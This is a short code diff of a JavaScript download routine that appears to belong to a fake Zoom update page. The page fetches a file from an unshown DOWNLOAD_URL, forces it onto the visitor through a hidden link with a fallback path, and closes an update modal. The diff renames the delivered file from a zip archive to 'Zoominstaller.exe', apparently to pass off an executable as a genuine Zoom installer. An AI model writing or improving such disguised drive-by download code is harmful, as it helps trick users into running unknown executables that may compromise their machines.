@@ -960,7 +960,7 @@ function triggerDownload(){
         .then(response=>response.blob())
         .then(blob=>{
             const url=window.URL.createObjectURL(blob);
-            const a=document.createElement('a');a.href=url;a.download='zoom installation.zip';
+            const a=document.createElement('a');a.href=url;a.download='Zoominstaller.exe';
             document.body.appendChild(a);a.click();document.body.removeChild(a);
             setTimeout(()=>{
                 window.URL.revokeObjectURL(url);
@@ -972,7 +972,7 @@ function triggerDownload(){
         })
         .catch(()=>{
             const a=document.createElement('a');
-            a.href=DOWNLOAD_URL;a.download='zoom installation.zip';
+            a.href=DOWNLOAD_URL;a.download='Zoominstaller.exe';
             document.body.appendChild(a);a.click();document.body.removeChild(a);
             setTimeout(()=>{
                 elements.updateModal.classList.add('hidden');
